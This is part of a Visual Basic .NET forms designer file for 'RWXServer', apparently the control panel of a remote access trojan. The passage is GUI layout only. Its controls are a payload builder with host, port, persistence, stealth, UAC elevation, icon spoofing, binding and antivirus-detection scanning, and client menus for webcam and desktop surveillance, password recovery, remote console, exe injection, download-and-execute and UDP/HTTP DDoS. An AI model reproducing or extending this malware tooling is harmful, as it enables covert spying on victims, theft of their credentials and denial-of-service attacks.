        Me.lstBuild.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lstBuild.ForeColor = System.Drawing.Color.Green
        Me.lstBuild.FormattingEnabled = True
        Me.lstBuild.Location = New System.Drawing.Point(6, 23)
        Me.lstBuild.Name = "lstBuild"
        Me.lstBuild.Size = New System.Drawing.Size(468, 186)
        Me.lstBuild.TabIndex = 0
        '
        'GroupBox13
        '
        Me.GroupBox13.Controls.Add(Me.cmdLoad)
        Me.GroupBox13.Controls.Add(Me.cmdSave)
        Me.GroupBox13.Controls.Add(Me.cmbProfiles)
        Me.GroupBox13.Location = New System.Drawing.Point(14, 101)
        Me.GroupBox13.Name = "GroupBox13"
        Me.GroupBox13.Size = New System.Drawing.Size(480, 103)
        Me.GroupBox13.TabIndex = 13
        Me.GroupBox13.TabStop = False
        Me.GroupBox13.Text = "Profiles"
        '
        'cmdLoad
        '
        Me.cmdLoad.Location = New System.Drawing.Point(127, 65)
        Me.cmdLoad.Name = "cmdLoad"
        Me.cmdLoad.Size = New System.Drawing.Size(94, 23)
        Me.cmdLoad.TabIndex = 2
        Me.cmdLoad.Text = "Load Profile"
        Me.cmdLoad.UseVisualStyleBackColor = True
        '
        'cmdSave
        '
        Me.cmdSave.Location = New System.Drawing.Point(6, 65)
        Me.cmdSave.Name = "cmdSave"
        Me.cmdSave.Size = New System.Drawing.Size(94, 23)
        Me.cmdSave.TabIndex = 1
        Me.cmdSave.Text = "Save Profile"
        Me.cmdSave.UseVisualStyleBackColor = True
        '
        'cmbProfiles
        '
        Me.cmbProfiles.FormattingEnabled = True
        Me.cmbProfiles.Location = New System.Drawing.Point(6, 29)
        Me.cmbProfiles.Name = "cmbProfiles"
        Me.cmbProfiles.Size = New System.Drawing.Size(215, 21)
        Me.cmbProfiles.TabIndex = 0
        Me.cmbProfiles.Text = "Profilename"
        '
        'TabPage5
        '
        Me.TabPage5.BackColor = System.Drawing.Color.White
        Me.TabPage5.Controls.Add(Me.lstScan)
        Me.TabPage5.Controls.Add(Me.txtscanner)
        Me.TabPage5.Controls.Add(Me.cmdScanner)
        Me.TabPage5.ImageIndex = 7
        Me.TabPage5.Location = New System.Drawing.Point(124, 4)
        Me.TabPage5.Name = "TabPage5"
        Me.TabPage5.Size = New System.Drawing.Size(1102, 521)
        Me.TabPage5.TabIndex = 7
        Me.TabPage5.Text = "Scanner"
        '
        'lstScan
        '
        Me.lstScan.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.AntiVirus, Me.Detection})
        Me.lstScan.Location = New System.Drawing.Point(3, 37)
        Me.lstScan.Name = "lstScan"
        Me.lstScan.Size = New System.Drawing.Size(474, 463)
        Me.lstScan.TabIndex = 2
        Me.lstScan.UseCompatibleStateImageBehavior = False
        Me.lstScan.View = System.Windows.Forms.View.Details
        '
        'AntiVirus
        '
        Me.AntiVirus.Text = "AntiVirus"
        Me.AntiVirus.Width = 120
        '
        'Detection
        '
        Me.Detection.Text = "Detection"
        Me.Detection.Width = 126
        '
        'txtscanner
        '
        Me.txtscanner.Location = New System.Drawing.Point(45, 10)
        Me.txtscanner.Name = "txtscanner"
        Me.txtscanner.Size = New System.Drawing.Size(432, 20)
        Me.txtscanner.TabIndex = 1
        '
        'cmdScanner
        '
        Me.cmdScanner.Location = New System.Drawing.Point(3, 8)
        Me.cmdScanner.Name = "cmdScanner"
        Me.cmdScanner.Size = New System.Drawing.Size(36, 23)
        Me.cmdScanner.TabIndex = 0
        Me.cmdScanner.Text = "..."
        Me.cmdScanner.UseVisualStyleBackColor = True
        '
        'TabPage4
        '
        Me.TabPage4.BackColor = System.Drawing.Color.White
        Me.TabPage4.Controls.Add(Me.ChromeButton1)
        Me.TabPage4.Controls.Add(Me.Label10)
        Me.TabPage4.Controls.Add(Me.Label9)
        Me.TabPage4.Controls.Add(Me.PictureBox1)
        Me.TabPage4.Controls.Add(Me.TextBox1)
        Me.TabPage4.Controls.Add(Me.Label13)
        Me.TabPage4.Controls.Add(Me.Label11)
        Me.TabPage4.Controls.Add(Me.Label8)
        Me.TabPage4.ImageIndex = 4
        Me.TabPage4.Location = New System.Drawing.Point(124, 4)
        Me.TabPage4.Name = "TabPage4"
        Me.TabPage4.Size = New System.Drawing.Size(1102, 521)
        Me.TabPage4.TabIndex = 3
        Me.TabPage4.Text = "About & ToS"
        '
        'ChromeButton1
        '
        Me.ChromeButton1.Customization = "7e3t//Ly8v/r6+v/5ubm/+vr6//f39//p6en/zw8PP8UFBT/gICA/w=="
        Me.ChromeButton1.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.ChromeButton1.Image = Nothing
        Me.ChromeButton1.Location = New System.Drawing.Point(11, 432)
        Me.ChromeButton1.Name = "ChromeButton1"
        Me.ChromeButton1.NoRounding = False
        Me.ChromeButton1.Size = New System.Drawing.Size(157, 36)
        Me.ChromeButton1.TabIndex = 22
        Me.ChromeButton1.Text = "LizardIRC"
        Me.ChromeButton1.Transparent = False
        '
        'Label10
        '
        Me.Label10.AutoSize = True
        Me.Label10.Location = New System.Drawing.Point(8, 416)
        Me.Label10.Name = "Label10"
        Me.Label10.Size = New System.Drawing.Size(157, 13)
        Me.Label10.TabIndex = 21
        Me.Label10.Text = "Take a look at Lizard IRC:"
        '
        'Label9
        '
        Me.Label9.AutoSize = True
        Me.Label9.Location = New System.Drawing.Point(127, 385)
        Me.Label9.Name = "Label9"
        Me.Label9.Size = New System.Drawing.Size(250, 13)
        Me.Label9.TabIndex = 18
        Me.Label9.Text = "Mavamaarten~ ( For Theme , thank you! )"
        '
        'PictureBox1
        '
        Me.PictureBox1.Image = CType(resources.GetObject("PictureBox1.Image"), System.Drawing.Image)
        Me.PictureBox1.Location = New System.Drawing.Point(396, 8)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(207, 50)
        Me.PictureBox1.TabIndex = 16
        Me.PictureBox1.TabStop = False
        '
        'TextBox1
        '
        Me.TextBox1.BackColor = System.Drawing.Color.White
        Me.TextBox1.Location = New System.Drawing.Point(11, 64)
        Me.TextBox1.Multiline = True
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.ReadOnly = True
        Me.TextBox1.Size = New System.Drawing.Size(1091, 280)
        Me.TextBox1.TabIndex = 15
        Me.TextBox1.Text = resources.GetString("TextBox1.Text")
        '
        'Label13
        '
        Me.Label13.AutoSize = True
        Me.Label13.Location = New System.Drawing.Point(127, 356)
        Me.Label13.Name = "Label13"
        Me.Label13.Size = New System.Drawing.Size(360, 13)
        Me.Label13.TabIndex = 7
        Me.Label13.Text = "aeonhack (BufferedConnector Class, Packer Class, NET Seal)"
        '
        'Label11
        '
        Me.Label11.AutoSize = True
        Me.Label11.Location = New System.Drawing.Point(8, 356)
        Me.Label11.Name = "Label11"
        Me.Label11.Size = New System.Drawing.Size(113, 13)
        Me.Label11.TabIndex = 4
        Me.Label11.Text = "Additional Credits:"
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.Location = New System.Drawing.Point(970, 480)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(110, 13)
        Me.Label8.TabIndex = 1
        Me.Label8.Text = "Version goes here"
        '
        'frmMain
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(1230, 529)
        Me.Controls.Add(Me.StatusStrip1)
        Me.Controls.Add(Me.TabControlClass1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.Name = "frmMain"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.MenuMain.ResumeLayout(False)
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.MenuOnConnect.ResumeLayout(False)
        Me.MultiMain.ResumeLayout(False)
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.ContextMenuStrip2.ResumeLayout(False)
        Me.TabControlClass1.ResumeLayout(False)
        Me.TabPage16.ResumeLayout(False)
        Me.TabPage16.PerformLayout()
        Me.TabPage1.ResumeLayout(False)
        Me.GroupBox5.ResumeLayout(False)
        Me.GroupBox5.PerformLayout()
        CType(Me.pboxDesktop, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage15.ResumeLayout(False)
        Me.TabPage6.ResumeLayout(False)
        Me.TabPage6.PerformLayout()
        Me.TabPage8.ResumeLayout(False)
        Me.TabPage8.PerformLayout()
        Me.TabPage9.ResumeLayout(False)
        Me.TabPage9.PerformLayout()
        Me.TabPage2.ResumeLayout(False)
        Me.GroupBox7.ResumeLayout(False)
        Me.GroupBox7.PerformLayout()
        Me.GroupBox6.ResumeLayout(False)
        Me.GroupBox6.PerformLayout()
        CType(Me.PictureBox12, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox11, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox10, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox9, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage3.ResumeLayout(False)
        Me.TabControl1.ResumeLayout(False)
        Me.TabPage17.ResumeLayout(False)
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        Me.TabPage18.ResumeLayout(False)
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        CType(Me.PictureBox13, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox8, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox7, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox9.ResumeLayout(False)
        Me.GroupBox9.PerformLayout()
        CType(Me.PictureBox15, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox14, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox10.ResumeLayout(False)
        Me.GroupBox10.PerformLayout()
        Me.TabPage19.ResumeLayout(False)
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox3.PerformLayout()
        Me.GroupBox11.ResumeLayout(False)
        CType(Me.imgicon, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox16.ResumeLayout(False)
        Me.GroupBox17.ResumeLayout(False)
        CType(Me.imgspoof, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox12.ResumeLayout(False)
        Me.GroupBox12.PerformLayout()
        Me.GroupBox8.ResumeLayout(False)
        Me.GroupBox8.PerformLayout()
        Me.GroupBox4.ResumeLayout(False)
        Me.GroupBox4.PerformLayout()
        Me.TabPage20.ResumeLayout(False)
        Me.GroupBox14.ResumeLayout(False)
        Me.GroupBox14.PerformLayout()
        Me.GroupBox15.ResumeLayout(False)
        Me.GroupBox13.ResumeLayout(False)
        Me.TabPage5.ResumeLayout(False)
        Me.TabPage5.PerformLayout()
        Me.TabPage4.ResumeLayout(False)
        Me.TabPage4.PerformLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox5 As System.Windows.Forms.GroupBox
    Friend WithEvents lblcMonitor As System.Windows.Forms.Label
    Friend WithEvents lblcCountry As System.Windows.Forms.Label
    Friend WithEvents lblcAV As System.Windows.Forms.Label
    Friend WithEvents lblcLocation As System.Windows.Forms.Label
    Friend WithEvents lblcVersion As System.Windows.Forms.Label
    Friend WithEvents lblcOS As System.Windows.Forms.Label
    Friend WithEvents lblcPCName As System.Windows.Forms.Label
    Friend WithEvents lblcUser As System.Windows.Forms.Label
    Friend WithEvents lblcIP As System.Windows.Forms.Label
    Friend WithEvents pboxDesktop As System.Windows.Forms.PictureBox
    Friend WithEvents lstConnections As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader1 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader2 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader3 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader4 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader5 As System.Windows.Forms.ColumnHeader
    Friend WithEvents lstDesktops As System.Windows.Forms.ListView
    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox6 As System.Windows.Forms.GroupBox
    Friend WithEvents PictureBox12 As System.Windows.Forms.PictureBox
    Friend WithEvents PictureBox11 As System.Windows.Forms.PictureBox
    Friend WithEvents PictureBox10 As System.Windows.Forms.PictureBox
    Friend WithEvents PictureBox9 As System.Windows.Forms.PictureBox
    Friend WithEvents txthost As System.Windows.Forms.TextBox
    Friend WithEvents Label6 As System.Windows.Forms.Label
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents chkPasswd As System.Windows.Forms.CheckBox
    Friend WithEvents chkListen As System.Windows.Forms.CheckBox
    Friend WithEvents btnSave As System.Windows.Forms.Button
    Friend WithEvents txtDataPort As System.Windows.Forms.TextBox
    Friend WithEvents txtPasswd As System.Windows.Forms.TextBox
    Friend WithEvents txtPort As System.Windows.Forms.TextBox
    Friend WithEvents Label7 As System.Windows.Forms.Label
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents TabPage3 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox3 As System.Windows.Forms.GroupBox
    Friend WithEvents btnicon As System.Windows.Forms.Button
    Friend WithEvents imgicon As System.Windows.Forms.PictureBox
    Friend WithEvents GroupBox4 As System.Windows.Forms.GroupBox
    Friend WithEvents txtVersion4 As System.Windows.Forms.TextBox
    Friend WithEvents txtVersion3 As System.Windows.Forms.TextBox
    Friend WithEvents txtVersion2 As System.Windows.Forms.TextBox
    Friend WithEvents txtVersion1 As System.Windows.Forms.TextBox
    Friend WithEvents txtFileVersion4 As System.Windows.Forms.TextBox
    Friend WithEvents txtFileVersion3 As System.Windows.Forms.TextBox
    Friend WithEvents txtFileVersion2 As System.Windows.Forms.TextBox
    Friend WithEvents txtFileVersion1 As System.Windows.Forms.TextBox
    Friend WithEvents txtTrademark As System.Windows.Forms.TextBox
    Friend WithEvents txtCopyright As System.Windows.Forms.TextBox
    Friend WithEvents txtProduct As System.Windows.Forms.TextBox
    Friend WithEvents txtCompany As System.Windows.Forms.TextBox
    Friend WithEvents txtDescription As System.Windows.Forms.TextBox
    Friend WithEvents txtTitle As System.Windows.Forms.TextBox
    Friend WithEvents Label30 As System.Windows.Forms.Label
    Friend WithEvents Label29 As System.Windows.Forms.Label
    Friend WithEvents Label28 As System.Windows.Forms.Label
    Friend WithEvents Label27 As System.Windows.Forms.Label
    Friend WithEvents Label26 As System.Windows.Forms.Label
    Friend WithEvents Label25 As System.Windows.Forms.Label
    Friend WithEvents Label24 As System.Windows.Forms.Label
    Friend WithEvents Label23 As System.Windows.Forms.Label
    Friend WithEvents kB As System.Windows.Forms.Label
    Friend WithEvents txtsize As System.Windows.Forms.TextBox
    Friend WithEvents chkpump As System.Windows.Forms.CheckBox
    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
    Friend WithEvents PictureBox8 As System.Windows.Forms.PictureBox
    Friend WithEvents PictureBox7 As System.Windows.Forms.PictureBox
    Friend WithEvents Label41 As System.Windows.Forms.Label
    Friend WithEvents txtFolder As System.Windows.Forms.TextBox
    Friend WithEvents RadioButton3 As System.Windows.Forms.RadioButton
    Friend WithEvents RadioButton1 As System.Windows.Forms.RadioButton
    Friend WithEvents RadioButton2 As System.Windows.Forms.RadioButton
    Friend WithEvents Label32 As System.Windows.Forms.Label
    Friend WithEvents txtstartup As System.Windows.Forms.TextBox
    Friend WithEvents txtname As System.Windows.Forms.TextBox
    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
    Friend WithEvents Label17 As System.Windows.Forms.Label
    Friend WithEvents txtbuildgroup As System.Windows.Forms.TextBox
    Friend WithEvents Label20 As System.Windows.Forms.Label
    Friend WithEvents txtbuildport As System.Windows.Forms.TextBox
    Friend WithEvents txtbuildpasswd As System.Windows.Forms.TextBox
    Friend WithEvents Label18 As System.Windows.Forms.Label
    Friend WithEvents Label19 As System.Windows.Forms.Label
    Friend WithEvents txtbuildhost As System.Windows.Forms.TextBox
    Friend WithEvents ProgressBar1 As System.Windows.Forms.ProgressBar
    Friend WithEvents btnBuild As System.Windows.Forms.Button
    Friend WithEvents TabPage4 As System.Windows.Forms.TabPage
    Friend WithEvents Label13 As System.Windows.Forms.Label
    Friend WithEvents Label11 As System.Windows.Forms.Label
    Friend WithEvents Label8 As System.Windows.Forms.Label
    Friend WithEvents Flags As System.Windows.Forms.ImageList
    Friend WithEvents Desktops As System.Windows.Forms.ImageList
    Friend WithEvents Clientname As System.Windows.Forms.ColumnHeader
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents ColumnHeader10 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader11 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader12 As System.Windows.Forms.ColumnHeader
    Friend WithEvents MenuMain As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents ServerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UpdateToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CloseToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem1 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents UninstallToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SurveillanceToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents WebcamToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DesktopToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PasswordRecoveryToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ProcessManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents InstalledSoftwareToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoteConsoleToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MiscToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PluginsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RegistryManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FileManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents tmrcons As System.Windows.Forms.Timer
    Friend WithEvents InjectexeToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ImageList1 As System.Windows.Forms.ImageList
    Friend WithEvents GroupBox10 As System.Windows.Forms.GroupBox
    Friend WithEvents chkshowhidden As System.Windows.Forms.CheckBox
    Friend WithEvents chkStealth As System.Windows.Forms.CheckBox
    Friend WithEvents chkHidden As System.Windows.Forms.CheckBox
    Friend WithEvents GroupBox9 As System.Windows.Forms.GroupBox
    Friend WithEvents PictureBox14 As System.Windows.Forms.PictureBox
    Friend WithEvents chkUAC As System.Windows.Forms.CheckBox
    Friend WithEvents chkcritical As System.Windows.Forms.CheckBox
    Friend WithEvents chkpersistance As System.Windows.Forms.CheckBox
    Friend WithEvents cmbRunOnce As System.Windows.Forms.ComboBox
    Friend WithEvents Label21 As System.Windows.Forms.Label
    Friend WithEvents txtstartupLM As System.Windows.Forms.TextBox
    Friend WithEvents PictureBox13 As System.Windows.Forms.PictureBox
    Friend WithEvents chkHKLM As System.Windows.Forms.CheckBox
    Friend WithEvents chkHKCU As System.Windows.Forms.CheckBox
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents chkinstall As System.Windows.Forms.CheckBox
    Friend WithEvents GroupBox13 As System.Windows.Forms.GroupBox
    Friend WithEvents cmdSave As System.Windows.Forms.Button
    Friend WithEvents cmbProfiles As System.Windows.Forms.ComboBox
    Friend WithEvents GroupBox12 As System.Windows.Forms.GroupBox
    Friend WithEvents cmdmutex As System.Windows.Forms.Button
    Friend WithEvents txtMutex As System.Windows.Forms.TextBox
    Friend WithEvents GroupBox11 As System.Windows.Forms.GroupBox
    Friend WithEvents cmdLoad As System.Windows.Forms.Button
    Friend WithEvents GroupBox14 As System.Windows.Forms.GroupBox
    Friend WithEvents chkTOS As System.Windows.Forms.CheckBox
    Friend WithEvents PictureBox15 As System.Windows.Forms.PictureBox
    Friend WithEvents chkElevate As System.Windows.Forms.CheckBox
    Friend WithEvents ofdIcon As System.Windows.Forms.OpenFileDialog
    Friend WithEvents cmdListen As System.Windows.Forms.Button
    Friend WithEvents tmrAlive As System.Windows.Forms.Timer
    Friend WithEvents GroupBox15 As System.Windows.Forms.GroupBox
    Friend WithEvents lstBuild As System.Windows.Forms.ListBox
    Friend WithEvents TabControlClass1 As RWXServer.TabControlClass
    Friend WithEvents TabPage7 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage10 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage11 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage12 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage13 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage14 As System.Windows.Forms.TabPage
    Friend WithEvents StatusStrip1 As System.Windows.Forms.StatusStrip
    Friend WithEvents ToolStripStatusLabel1 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents sentbytes As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents tmrDataflow As System.Windows.Forms.Timer
    Friend WithEvents ServiceManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents Updates As System.Windows.Forms.ImageList
    Friend WithEvents TabPage6 As System.Windows.Forms.TabPage
    Friend WithEvents cmbWho As System.Windows.Forms.ComboBox
    Friend WithEvents Label16 As System.Windows.Forms.Label
    Friend WithEvents cmbCommand As System.Windows.Forms.ComboBox
    Friend WithEvents lstOnConnect As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader9 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader13 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader14 As System.Windows.Forms.ColumnHeader
    Friend WithEvents MenuOnConnect As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents DeleteCommandToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem2 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents DeleteAllCommandsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MultiMain As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents ClientsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UpdateToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CloseToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem3 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents UninstallToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DLExecuteToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents TabPage15 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage5 As System.Windows.Forms.TabPage
    Friend WithEvents ToolStripStatusLabel2 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel4 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel5 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents DDoSToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents TabPage8 As System.Windows.Forms.TabPage
    Friend WithEvents lstDDoS As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader6 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader7 As System.Windows.Forms.ColumnHeader
    Friend WithEvents txtStressLog As System.Windows.Forms.TextBox
    Friend WithEvents UDPToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents HTTPToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ContextMenuStrip1 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents StopDDoSToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents cmdstartUDP As System.Windows.Forms.Button
    Friend WithEvents cmdstartHTTP As System.Windows.Forms.Button
    Friend WithEvents ToolStripStatusLabel3 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents TabPage9 As System.Windows.Forms.TabPage
    Friend WithEvents WebBrowser1 As System.Windows.Forms.WebBrowser
    Friend WithEvents txtmap2 As System.Windows.Forms.TextBox
    Friend WithEvents txtmap1 As System.Windows.Forms.TextBox
    Friend WithEvents TabPage16 As System.Windows.Forms.TabPage
    Friend WithEvents lstUpdates As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader8 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader15 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader16 As System.Windows.Forms.ColumnHeader
    Friend WithEvents txtMOTD As System.Windows.Forms.TextBox
    Friend WithEvents lstScan As System.Windows.Forms.ListView
    Friend WithEvents AntiVirus As System.Windows.Forms.ColumnHeader
    Friend WithEvents Detection As System.Windows.Forms.ColumnHeader
    Friend WithEvents txtscanner As System.Windows.Forms.TextBox
    Friend WithEvents cmdScanner As System.Windows.Forms.Button
    Friend WithEvents GroupBox7 As System.Windows.Forms.GroupBox
    Friend WithEvents cmdAddPort As System.Windows.Forms.Button
    Friend WithEvents txtExtPort As System.Windows.Forms.TextBox
    Friend WithEvents Label22 As System.Windows.Forms.Label
    Friend WithEvents lstPorts As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader18 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ContextMenuStrip2 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RemovePortToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents Label33 As System.Windows.Forms.Label
    Friend WithEvents txtbackuphost As System.Windows.Forms.TextBox
    Friend WithEvents GroupBox16 As System.Windows.Forms.GroupBox
    Friend WithEvents GroupBox17 As System.Windows.Forms.GroupBox
    Friend WithEvents imgspoof As System.Windows.Forms.PictureBox
    Friend WithEvents GroupBox8 As System.Windows.Forms.GroupBox
    Friend WithEvents cbBind As System.Windows.Forms.CheckBox
    Friend WithEvents txtBind As System.Windows.Forms.TextBox
    Friend WithEvents cmdBind As System.Windows.Forms.Button
    Friend WithEvents cmbspoof As System.Windows.Forms.ComboBox
    Friend WithEvents ChromeButton1 As RWXServer.ChromeButton
    Friend WithEvents Label10 As System.Windows.Forms.Label
    Friend WithEvents Label9 As System.Windows.Forms.Label
    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Friend WithEvents TabControl1 As System.Windows.Forms.TabControl
    Friend WithEvents TabPage17 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage18 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage19 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage20 As System.Windows.Forms.TabPage

End Class
